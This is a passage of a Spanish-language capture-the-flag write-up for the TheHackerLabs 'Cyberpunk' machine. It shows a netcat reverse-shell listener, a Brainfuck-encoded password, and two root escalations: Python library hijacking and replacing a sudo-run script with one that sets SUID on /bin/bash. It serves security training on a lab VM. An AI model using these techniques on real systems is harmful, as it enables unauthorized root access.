+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -nlvp <span style="color:#ae81ff">443</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">443</span> ...
+</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>Tu_IP<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>192.168.1.120<span style="color:#f92672">]</span> <span style="color:#ae81ff">46368</span>
+</span></span><span style="display:flex;"><span>bash: cannot set terminal process group <span style="color:#f92672">(</span>487<span style="color:#f92672">)</span>: Inappropriate ioctl <span style="color:#66d9ef">for</span> device
+</span></span><span style="display:flex;"><span>bash: no job control in this shell
+</span></span><span style="display:flex;"><span>www-data@Cyberpunk:/var/www/html$
+</span></span></code></pre></div><p>Listo, volvimos a entrar a la máquina.</p>
+<h2 id="Post">Post Explotación</h2>
+<h3 id="LinEnum">Enumeración de la Máquina Víctima</h3>
+<p>Como el <strong>usuario www-data</strong> no podremos hacer mucho, pues tampoco podremos ver el directorio del <strong>usuario arasaka</strong>.</p>
+<p>Investigando un poco, podemos encontrar un archivo dentro del directorio <code>/opt</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>www-data@Cyberpunk:/home$ ls /opt
+</span></span><span style="display:flex;"><span>arasaka.txt
+</span></span></code></pre></div><p>Al ver su contenido, vemos algo extraño:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>www-data@Cyberpunk:/opt$ cat arasaka.txt 
+</span></span><span style="display:flex;"><span>++++++++++<span style="color:#f92672">[</span>&gt;++++++++++&gt;++++++++++++&gt;++++++++++&gt;++++++++++&gt;+++++++++++&gt;+++++++++++&gt;++++++++++++&gt;+++++++++++&gt;+++++++++++&gt;+++++&gt;+++++&gt;++++++<span style="color:#f92672">&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;</span>-<span style="color:#f92672">]</span>&gt;-.&gt;+.&gt;--.&gt;+.&gt;++++.&gt;++.&gt;---.&gt;.&gt;---.&gt;.&gt;--.&gt;-----..
+</span></span></code></pre></div><p>Investigando este código, descubrimos que se trata de <strong>lenguaje Brainfuck</strong>:</p>
+<table>
+	<thead>
+			<tr>
+					<th style="text-align: center"><strong>Lenguaje Brainfuck</strong></th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td style="text-align: center"><em>Brainfuck es un lenguaje de programación minimalista y es conocido por su sintaxis extremadamente simple y su capacidad de realizar tareas complejas con una estructura de comandos muy limitada. Los comandos de Brainfuck son símbolos de un solo carácter y cada uno realiza una operación diferente sobre un cinta de memoria (una especie de arreglo de celdas de datos).</em></td>
+			</tr>
+	</tbody>
+</table>
+<p>Podemos encontrar una página que puede decodificar este lenguaje:</p>
+<ul>
+<li><a href="https://md5decrypt.net/en/Brainfuck-translator/" target="_blank">Brainfuck Translator</a></li>
+</ul>
+<p>Vamos a copiar y a pegar el código que encontramos.</p>
+<p>Veamos que puede ser:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-cyberpunk/Captura7.png">
+</p>
+<p>Parece ser una contraseña.</p>
+<p>Vamos a comprobarlo utilizando al <strong>usuario arasaka</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh arasaka@192.168.1.120
+</span></span><span style="display:flex;"><span>arasaka@192.168.1.120<span style="color:#960050;background-color:#1e0010">&#39;</span>s password: 
+</span></span><span style="display:flex;"><span>Linux Cyberpunk 6.1.0-20-amd64 <span style="color:#75715e">#1 SMP PREEMPT_DYNAMIC Debian 6.1.85-1 (2024-04-11) x86_64</span>
+</span></span><span style="display:flex;"><span>.
+</span></span><span style="display:flex;"><span>The programs included with the Debian GNU/Linux system are free software;
+</span></span><span style="display:flex;"><span>the exact distribution terms <span style="color:#66d9ef">for</span> each program are described in the
+</span></span><span style="display:flex;"><span>individual files in /usr/share/doc/*/copyright.
+</span></span><span style="display:flex;"><span>.
+</span></span><span style="display:flex;"><span>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+</span></span><span style="display:flex;"><span>permitted by applicable law.
+</span></span><span style="display:flex;"><span>Last login: Fri Feb <span style="color:#ae81ff">21</span> 20:31:20 <span style="color:#ae81ff">2025</span>
+</span></span><span style="display:flex;"><span>arasaka@Cyberpunk:~$ whoami
+</span></span><span style="display:flex;"><span>arasaka
+</span></span></code></pre></div><p>Estamos dentro.</p>
+<h3 id="Hijacking">Aplicando Python Library Hijacking para Escalar Privilegios</h3>
+<p>Si revisamos el contenido del <strong>usuario arasaka</strong>, aparte de encontrar la flag del usuario, podemos encontrar un script:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>arasaka@Cyberpunk:~$ ls
+</span></span><span style="display:flex;"><span>randombase64.py  user.txt
+</span></span><span style="display:flex;"><span>arasaka@Cyberpunk:~$ cat user.txt
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>Revisando nuestros privilegios, resulta que podemos ejecutar este script como el <strong>Root</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>arasaka@Cyberpunk:~$ sudo -l
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> contraseña para arasaka: 
+</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#66d9ef">for</span> arasaka on Cyberpunk:
+</span></span><span style="display:flex;"><span>    env_reset, mail_badpass, secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin, use_pty
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>User arasaka may run the following commands on Cyberpunk:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> PASSWD: /usr/bin/python3.11 /home/arasaka/randombase64.py
+</span></span></code></pre></div><p>Analizando este script, nos damos cuenta de que solamente <strong>codifica en base64</strong> cualquier texto que le des:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>arasaka@Cyberpunk:~$ cat randombase64.py 
+</span></span><span style="display:flex;"><span>import base64
+</span></span><span style="display:flex;"><span>message <span style="color:#f92672">=</span> input<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Enter your string&#34;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>message_bytes <span style="color:#f92672">=</span> message.encode<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;ascii&#34;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>base64_bytes <span style="color:#f92672">=</span> base64.b64encode<span style="color:#f92672">(</span>message_bytes<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>base64_message <span style="color:#f92672">=</span> base64_bytes.decode<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;ascii&#34;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>.
+</span></span><span style="display:flex;"><span>print<span style="color:#f92672">(</span>base64_message<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>arasaka@Cyberpunk:~$ python3 randombase64.py 
+</span></span><span style="display:flex;"><span>Enter your stringpapu
+</span></span><span style="display:flex;"><span>cGFwdQ<span style="color:#f92672">==</span>
+</span></span></code></pre></div><p>Sabiendo esto, es claro que podemos intentar aplicar <strong>Python Library Hijacking</strong>.</p>
+<p>Para hacerlo, necesitamos conocer si el script está utilizando el directorio actual para buscar módulos que necesite usar.</p>
+<p>Esto lo podemos saber si obtenemos los paths de las librerías actuales que utiliza <strong>Python</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>arasaka@Cyberpunk:~$ python3 -c <span style="color:#e6db74">&#39;import sys; print(sys.path)&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span><span style="color:#e6db74">&#39;&#39;</span>, <span style="color:#e6db74">&#39;/usr/lib/python311.zip&#39;</span>, <span style="color:#e6db74">&#39;/usr/lib/python3.11&#39;</span>, <span style="color:#e6db74">&#39;/usr/lib/python3.11/lib-dynload&#39;</span>, <span style="color:#e6db74">&#39;/usr/local/lib/python3.11/dist-packages&#39;</span>, <span style="color:#e6db74">&#39;/usr/lib/python3/dist-packages&#39;</span><span style="color:#f92672">]</span>
+</span></span></code></pre></div><p>Ahí está, este directorio sí está siendo utilizado por el script.</p>
+<p>Ahora, necesitamos conocer el binario que está ocupando la <strong>librería base64</strong> del script:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>arasaka@Cyberpunk:~$ python3 -c <span style="color:#e6db74">&#34;import base64; print(base64.__file__)&#34;</span>
+</span></span><span style="display:flex;"><span>/usr/lib/python3.11/base64.py
+</span></span></code></pre></div><p>Lo tenemos, se llama <code>base64.py</code>.</p>
+<p>Tan solo tenemos que crear un script que cambie los permisos de la <strong>Bash</strong> para que tenga <strong>permisos SUID</strong>.</p>
+<p>El script debe tener el mismo nombre del binario a suplantar:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> os
+</span></span><span style="display:flex;"><span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;chmod u+s /bin/bash&#34;</span>)
+</span></span></code></pre></div><p>Revisa los permisos de la <strong>Bash</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>arasaka@Cyberpunk:~$ ls -la /bin/bash
+</span></span><span style="display:flex;"><span>-rwxr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">1265648</span> abr <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2023</span> /bin/bash
+</span></span></code></pre></div><p>Ya solamente, ejecutamos el script <code>randombase64.py</code> como <strong>Root</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>arasaka@Cyberpunk:~$ sudo /usr/bin/python3.11 /home/arasaka/randombase64.py
+</span></span><span style="display:flex;"><span>Enter your string hackeado   
+</span></span><span style="display:flex;"><span>Traceback <span style="color:#f92672">(</span>most recent call last<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>  File <span style="color:#e6db74">&#34;/home/arasaka/randombase64.py&#34;</span>, line 4, in &lt;module&gt;
+</span></span><span style="display:flex;"><span>    base64_bytes <span style="color:#f92672">=</span> base64.b64encode<span style="color:#f92672">(</span>message_bytes<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>                   ^^^^^^^^^^^^^^^^
+</span></span><span style="display:flex;"><span>AttributeError: module <span style="color:#e6db74">&#39;base64&#39;</span> has no attribute <span style="color:#e6db74">&#39;b64encode&#39;</span>
+</span></span></code></pre></div><p>Observa como falla el script al no funcionar la <strong>librería base64</strong> real.</p>
+<p>Comprobamos los permisos de la <strong>Bash</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>arasaka@Cyberpunk:~$ ls -la /bin/bash
+</span></span><span style="display:flex;"><span>-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">1265648</span> abr <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2023</span> /bin/bash
+</span></span></code></pre></div><p>Funciono.</p>
+<p>Y ejecutamos la <strong>Bash</strong> como <strong>Root</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>arasaka@Cyberpunk:~$ bash -p
+</span></span><span style="display:flex;"><span>bash-5.2# whoami
+</span></span><span style="display:flex;"><span>root
+</span></span></code></pre></div><p>Listo, ya somos <strong>Root</strong>.</p>
+<h3 id="Hijacking2">Aplicando Script Hijacking para Escalar Privilegios</h3>
+<p>¿De qué se trata esto?</p>
+<table>
+	<thead>
+			<tr>
+					<th style="text-align: center"><strong>Script Hijacking</strong></th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td style="text-align: center"><em>Script Hijacking es un tipo de ataque en el que un atacante sustituye, modifica o redirige un script legítimo en un sistema para ejecutar código malicioso o no autorizado. Esto puede ocurrir en varios contextos, pero se basa en el principio de que el script legítimo se ejecuta con privilegios elevados o en un entorno donde se le confía su ejecución.</em></td>
+			</tr>
+	</tbody>
+</table>
+<p>La idea es, que como este script está dentro del directorio del <strong>usuario arasaka</strong>, este usuario puede tener la capacidad de renombrar, mover o eliminar este script, solamente no puede modificarlo porque el dueño es el <strong>usuario Root</strong>.</p>
+<p>Vamos a comprobarlo, tratando de renombrar el script:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>arasaka@Cyberpunk:~$ mv randombase64.py nada.py
+</span></span><span style="display:flex;"><span>arasaka@Cyberpunk:~$ ls
+</span></span><span style="display:flex;"><span>nada.py  __pycache__  user.txt
+</span></span></code></pre></div><p>Sí se pudo.</p>
+<p>Ahora podemos crear el mismo script, pero agregaremos la <strong>librería os</strong> y la instrucción para cambiar los permisos de la <strong>Bash</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> base64
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>message <span style="color:#f92672">=</span> input(<span style="color:#e6db74">&#34;Enter your string: &#34;</span>)
+</span></span><span style="display:flex;"><span>message_bytes <span style="color:#f92672">=</span> message<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#34;ascii&#34;</span>)
+</span></span><span style="display:flex;"><span>base64_bytes <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b64encode(message_bytes)
+</span></span><span style="display:flex;"><span>base64_message <span style="color:#f92672">=</span> base64_bytes<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;ascii&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(base64_message)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;chmod u+s /bin/bash&#34;</span>)
+</span></span></code></pre></div><p>Revisa los permisos de la <strong>Bash</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>arasaka@Cyberpunk:~$ ls -la /bin/bash
+</span></span><span style="display:flex;"><span>-rwxr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">1265648</span> abr <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2023</span> /bin/bash
+</span></span></code></pre></div><p>Excelente, vamos a ejecutarlo como el <strong>usuario Root</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>arasaka@Cyberpunk:~$ sudo /usr/bin/python3.11 /home/arasaka/randombase64.py
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> contraseña para arasaka: 
+</span></span><span style="display:flex;"><span>Enter your string: hackeado
+</span></span><span style="display:flex;"><span>aGFja2VhZG8<span style="color:#f92672">=</span>
+</span></span></code></pre></div><p>Funciona, no hubo un problema en la ejecución.</p>
+<p>Veamos los permisos de la <strong>Bash</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>arasaka@Cyberpunk:~$ ls -la /bin/bash
+</span></span><span style="display:flex;"><span>-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">1265648</span> abr <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2023</span> /bin/bash
+</span></span></code></pre></div><p>Excelente, realmente funciono.</p>
+<p>Ya solo ejecutamos la <strong>Bash</strong> como <strong>Root</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>arasaka@Cyberpunk:~$ bash -p
+</span></span><span style="display:flex;"><span>bash-5.2# whoami
+</span></span><span style="display:flex;"><span>root
+</span></span></code></pre></div><p>Listo, ya somos <strong>Root</strong>.</p>
+<p>Ya solo buscamos la flag del <strong>Root</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>bash-5.2# cd /root
+</span></span><span style="display:flex;"><span>bash-5.2# ls
+</span></span><span style="display:flex;"><span>root.txt
+</span></span><span style="display:flex;"><span>bash-5.2# cat root.txt 
+</span></span><span style="display:flex;"><span>**************
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Enhorabuena, has podido desactivar el relic y salvar la vida de V.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>La transferencia de eddies a tu cuenta se ha mandado :D
+</span></span></code></pre></div><p>Con esto completamos la máquina y nos ganamos unos eddies jeje.</p>
+
+
+    
+    <h2 id="links-de-investigacion">Links de investigación</h2>
+    <ul>
+      <li><a href="https://github.com/pentestmonkey/php-reverse-shell" target="_blank" rel="noopener noreferrer">https://github.com/pentestmonkey/php-reverse-shell</a></li><li><a href="https://md5decrypt.net/en/Brainfuck-translator/" target="_blank" rel="noopener noreferrer">https://md5decrypt.net/en/Brainfuck-translator/</a></li><li><a href="https://deephacking.tech/path-hijacking-y-library-hijacking/" target="_blank" rel="noopener noreferrer">https://deephacking.tech/path-hijacking-y-library-hijacking/</a></li>
+    </ul>
+    
+  </div>
+
+  
+
+
+  
+
+  
+
+
+
+
+
+
+
+
+
+
+<nav class="post-nav">
+  
+  <a class="post-nav-link post-nav-prev" href="http://localhost:1313/THL-writeup-zapasguapas/">
+    <span class="post-nav-label">← Anterior</span>
+    <span class="post-nav-title">Zapas Guapas - TheHackerLabs</span>
+  </a>
+  
+  
+  <a class="post-nav-link post-nav-next" href="http://localhost:1313/THL-writeup-pacharan/">
+    <span class="post-nav-label">Siguiente →</span>
+    <span class="post-nav-title">Pacharan - TheHackerLabs</span>
+  </a>
+  
+</nav>
+
+
+
+</article>
+
+  </main>
+  <footer class="site-footer">
+  <div class="wrap">
+    <p>&copy; 2026 BerserkWings · México
+       · <a href="https://github.com/BerserkWings" target="_blank" rel="noopener noreferrer">GitHub</a>
+    </p>
+  </div>
+</footer>
+
+  
+
+
+<a href="#indice" class="back-to-top" id="backToTop" aria-label="Volver al índice">&uarr;</a>
+
+
+<script src="/js/main.min.15ff80349759f71df793ae28568ef0a6a9c3eb6efe99c9e96bad1d9236a26c31.js" integrity="sha256-Ff&#43;ANJdZ9x33k64oVo7wpqnD627&#43;mcnpa60dkjaibDE=" defer></script>
+
+</body>
+</html>
